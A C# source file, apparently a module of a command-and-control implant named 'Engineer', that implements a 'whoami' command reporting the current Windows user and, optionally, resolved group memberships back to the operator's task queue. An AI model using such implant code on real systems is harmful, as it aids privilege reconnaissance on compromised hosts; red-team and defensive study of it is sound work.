using System;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;

namespace Engineer.Commands
{
    internal class WhoAmI : EngineerCommand
    {
        public override string Name => "whoami";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                var identity = WindowsIdentity.GetCurrent();
                string Username = identity.Name;
                if (task.Arguments != null)
                {
                    if (task.Arguments.ContainsKey("/groups"))
                    {
                        StringBuilder output = new StringBuilder();
                        var groups = identity.Groups;
                        var groupNames = groups.Select(g => g.Value);
                        foreach ( var group in groupNames) 
                        {
                            //resolve the SID into a name if possible 
                            string groupName = "";
                            var sid = new SecurityIdentifier(group);
                            try
                            {
                                groupName= sid.Translate(typeof(NTAccount)).Value;
                            }
                            catch (IdentityNotMappedException)
                            {
                                // This SID cannot be translated to a name
                                groupName = group;
                            }
                            output.AppendLine(groupName);
                        }
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"{Username} is a member of the following groups:\n {output}", task, EngTaskStatus.Complete, TaskResponseType.String);
                    }
                }
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"{Username}", task, EngTaskStatus.Complete, TaskResponseType.String);
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
            }
            
        }
    }
}
